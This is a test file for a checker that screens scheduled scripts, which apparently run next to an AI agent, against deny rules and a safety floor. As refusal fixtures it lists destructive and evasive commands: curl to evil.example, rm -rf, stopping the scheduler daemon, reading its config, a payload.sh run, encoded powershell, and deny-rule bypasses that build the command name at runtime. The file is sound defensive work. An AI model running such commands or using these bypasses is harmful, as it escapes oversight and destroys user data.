/**
 * The static check a `script`/`script+agent` job's script body passes before
 * it is ever confirmed: the scheduled-run floor over the whole text, then
 * every config file's and the job's own `deny` rules over each lexed
 * command (`compileScriptCheckPolicy`). Exhaustive in the style of
 * `floor.test.ts`: every floor-refusal fixture re-run as a whole script
 * body, plus the shapes specific to "per command, deny-only".
 *
 * The permission-model revision (design.md §6, 2026-09-24): the first
 * version of this checker ran the WHOLE script against the job's full
 * permission set (allow/ask/deny/unmatched), so a script needed an `allow`
 * rule to pass at all — in practice a blanket `bash: allow`, since a script
 * rarely equals one exact pattern — and because a `script+agent` job has one
 * permission set, that blanket rule then gave the model itself unrestricted
 * `bash` in the agent phase. `does not need any allow rule at all` below is
 * the regression test for exactly that report.
 */

import { describe, expect, it } from 'vitest'
import { compileScriptCheckPolicy, expandPermissions } from '../policy.js'
import { verifyScheduledScript } from '../script-check.js'
import type { SchedulePermissionSet } from '../types.js'

const HOME = '/home/u/.namzu'

/** A script-check policy from a permission input, with no config-file layers. */
function policyFor(input: {
	readonly rules?: SchedulePermissionSet['rules']
	readonly unmatched?: SchedulePermissionSet['unmatched']
}) {
	const set = expandPermissions({
		rules: input.rules ?? {},
		unmatched: input.unmatched ?? 'deny',
	})
	return compileScriptCheckPolicy(set, { layers: [], namzuHome: HOME })
}

/** No rules at all beyond `unmatched: deny` — nothing to allow the script, and nothing needs to. */
const NO_RULES = policyFor({ rules: {}, unmatched: 'deny' })

function ok(body: string, shell: 'bash' | 'sh' = 'bash', policy = NO_RULES): boolean {
	return verifyScheduledScript(body, shell, policy).ok
}

describe('the permission-model fix: no allow rule is needed', () => {
	it('a floor-clean script with an EMPTY rule set is allowed — no blanket bash: allow required', () => {
		expect(ok('echo hello')).toBe(true)
		expect(ok('date -u >> ticks.log')).toBe(true)
	})

	it('unmatched (park/deny/allow) makes no difference to the script: only deny rules and the floor do', () => {
		for (const unmatched of ['park', 'deny', 'allow'] as const) {
			const policy = policyFor({ rules: {}, unmatched })
			expect(ok('echo hello', 'bash', policy), unmatched).toBe(true)
		}
	})

	it('an "allow" or "ask" rule for bash changes nothing for the script — neither consulted', () => {
		expect(ok('echo hello', 'bash', policyFor({ rules: { bash: 'allow' } }))).toBe(true)
		expect(ok('echo hello', 'bash', policyFor({ rules: { bash: 'ask' } }))).toBe(true)
		// An allow rule does not widen what the floor/deny rules already refuse.
		expect(ok(`cat ${HOME}/config.yaml`, 'bash', policyFor({ rules: { bash: 'allow' } }))).toBe(
			false,
		)
	})

	it('compileScriptCheckPolicy never emits an allow-shaped rule for the job’s own rules', () => {
		const policy = policyFor({ rules: { bash: 'allow', read: 'allow' }, unmatched: 'allow' })
		for (const rule of policy.denyRules) {
			expect(rule.type === 'allow_by_name' || rule.type === 'allow_by_category').toBe(false)
			if (rule.type === 'argument_pattern' || rule.type === 'custom_pattern') {
				expect(rule.decision).toBe('deny')
			}
		}
	})
})

describe('deny rules, per lexed command', () => {
	it('refuses the exact command a deny rule matches, naming it', () => {
		const policy = policyFor({ rules: { bash: { 'curl*': 'deny' } } })
		expect(ok('echo hi', 'bash', policy)).toBe(true)
		const result = verifyScheduledScript('echo hi\ncurl http://evil.example/x', 'bash', policy)
		expect(result.ok).toBe(false)
		expect(result.reason).toContain('curl http://evil.example/x')
	})

	it('a deny rule from a config-file layer refuses too', () => {
		const set = expandPermissions({ rules: {}, unmatched: 'deny' })
		const policy = compileScriptCheckPolicy(set, {
			layers: [
				{
					source: 'user-file',
					path: '/u/config.yaml',
					permissions: { bash: { 'rm *': 'deny' } },
				},
			],
			namzuHome: HOME,
		})
		expect(ok('echo hi', 'bash', policy)).toBe(true)
		expect(ok('rm -rf notes/', 'bash', policy)).toBe(false)
	})

	it('a blanket bash: deny refuses every command', () => {
		const policy = policyFor({ rules: { bash: 'deny' } })
		expect(ok('echo hi', 'bash', policy)).toBe(false)
	})

	it('leaves a command an unrelated deny rule does not name untouched', () => {
		const policy = policyFor({ rules: { edit: 'deny' } })
		expect(ok('echo hi', 'bash', policy)).toBe(true)
	})
})

describe('the scheduled-run floor, as a whole script body', () => {
	it('refuses every floor fixture that a live bash call would be denied for', () => {
		const denied = [
			'systemctl --user stop namzu-scheduler',
			'launchctl bootout gui/501/com.namzu.scheduler',
			'schtasks /TN \\namzu\\scheduler /F /Delete',
			'pkill node',
			"pkill -f 'schedule daemon'",
			'namzu schedule remove nightly',
			'namzu schedule stop',
			`cat ${HOME}/config.yaml`,
			`echo x >> ${HOME}/schedule/jobs/a.json`,
			'ls /mnt/c/Users/A/AppData/Local/namzu',
			"echo 'namzu schedule remove x' | sh",
			'bash <<EOF\nsystemctl --user stop namzu-scheduler\nEOF',
			"sudo bash -c 'namzu schedule stop'",
			'$(echo namzu) schedule stop',
			'powershell.exe -NoProfile -Command "namzu schedule stop"',
			"powershell -c 'namzu schedule stop'",
			// The three floor bypasses closed alongside the permission-model fix
			// (design.md §6 revision) protect a script the same way they now
			// protect a live bash call.
			"trap 'rm -rf ~/.namzu' EXIT",
			'find / -name .namzu -exec rm -rf {} \\;',
			'find / -name "namzu-scheduler*" -exec systemctl stop {} \\;',
			'cp /tmp/payload.sh /tmp/run.sh; bash /tmp/run.sh',
		]
		for (const body of denied) expect(ok(body), body).toBe(false)
	})

	it('allows a floor-clean script with no rules at all', () => {
		const allowed = [
			'echo hello',
			'date',
			"echo 'systemctl --user stop namzu-scheduler'",
			'namzu schedule list',
			'ls ~/.namzu-other',
		]
		for (const body of allowed) expect(ok(body), body).toBe(true)
	})
})

describe('one call, whole text, for the floor; per command for deny rules', () => {
	it('reads a multi-statement script as one command line for the floor', () => {
		expect(ok('echo one && echo two; echo three')).toBe(true)
		expect(ok('echo one && systemctl --user stop namzu-scheduler')).toBe(false)
	})

	it('reads loops', () => {
		expect(ok('for f in *.txt; do echo "$f"; done')).toBe(true)
		expect(ok(`for d in ${HOME}; do cat "$d/config.yaml"; done`)).toBe(false)
	})

	it('reads case statements', () => {
		expect(ok('case "$1" in start) echo hi ;; *) echo no ;; esac')).toBe(true)
		expect(ok(`case "$1" in start) cat ${HOME}/config.yaml ;; esac`)).toBe(false)
	})

	it('reads a clean command substitution instead of refusing the script outright', () => {
		// `$(…)`/backtick content is read as a nested command line, checked
		// by the floor and the same deny rules as everything else in the
		// script — not blanket-refused just for containing one.
		expect(ok('echo "$(date)"')).toBe(true)
		expect(ok('echo "$(date)"', 'bash', policyFor({ rules: { bash: { 'date*': 'deny' } } }))).toBe(
			false,
		)
	})

	it('still refuses a genuinely opaque construct outright: no fallback tripwire', () => {
		// `${ …; }` (bash 5.3's brace-form command substitution) is left
		// opaque; unlike `$(…)`/backtick, it is out of this scope.
		const result = verifyScheduledScript('echo "${ date; }"', 'bash', NO_RULES)
		expect(result.ok).toBe(false)
		expect(result.reason).toMatch(/cannot be verified line-for-line/)
		expect(result.reason).toMatch(/command substitution/)
	})

	// A security review of the command-substitution fix (668557ae) found
	// that a command whose OWN NAME comes from a substitution defeats a
	// `deny` rule written against the real name, since the name never
	// appears as such anywhere in the script's text: `git push*` never
	// matches `$(echo git) push origin main`'s command text. Refused at
	// confirm time, the same posture as opaque, naming the command.
	it('refuses a command whose own name is decided at runtime, even where the script otherwise reads clean', () => {
		const gitPush = policyFor({ rules: { bash: { 'git push*': 'deny' } } })
		expect(ok('git push origin main', 'bash', gitPush)).toBe(false) // sanity: the literal case is denied
		for (const body of [
			'$(echo git) push origin main',
			'`echo git` push origin main',
			'X=$(echo git); $X push origin main',
		]) {
			const result = verifyScheduledScript(body, 'bash', gitPush)
			expect(result.ok, body).toBe(false)
			expect(result.reason, body).toMatch(/name is decided at runtime/)
		}
		const rm = policyFor({ rules: { bash: { 'rm*': 'deny' } } })
		for (const body of [
			'$(echo rm) -rf /tmp/x',
			'$(echo r)m -rf /tmp/x',
			'$(echo r)"m" -rf /tmp/x',
		]) {
			const result = verifyScheduledScript(body, 'bash', rm)
			expect(result.ok, body).toBe(false)
			expect(result.reason, body).toMatch(/name is decided at runtime/)
		}
	})

	it('does not refuse a literal command name with substitutions only in its arguments', () => {
		// Negative control: the fix is about the command's own NAME, not
		// about a script using substitutions at all (already proven safe
		// above) or about the specific commands the review's probes named.
		expect(ok('git push origin "$(cat branch-name.txt)"')).toBe(true)
		expect(ok('rm -rf "$(echo /tmp/x)"')).toBe(true)
		expect(ok('echo "$(date)"')).toBe(true)
	})

	it('a deny rule wins even though nothing needs to allow the rest', () => {
		const policy = policyFor({ rules: { bash: { 'curl*': 'deny' } } })
		expect(ok(`cat ${HOME}/config.yaml`, 'bash', policy)).toBe(false)
	})
})

describe('powershell -EncodedCommand in a script body', () => {
	it('is refused outright, not merely reviewed', () => {
		const encoded = Buffer.from('Write-Host hi', 'utf16le').toString('base64')
		expect(ok(`powershell.exe -EncodedCommand ${encoded}`)).toBe(false)
	})
})

describe('the reading, dialect by dialect', () => {
	it('reads a bash-only construct as opaque under sh, and reads it under bash', () => {
		expect(verifyScheduledScript("echo $'\\x61'", 'sh', NO_RULES).ok).toBe(false)
		expect(verifyScheduledScript("echo $'\\x61'", 'bash', NO_RULES).ok).toBe(true)
	})
})
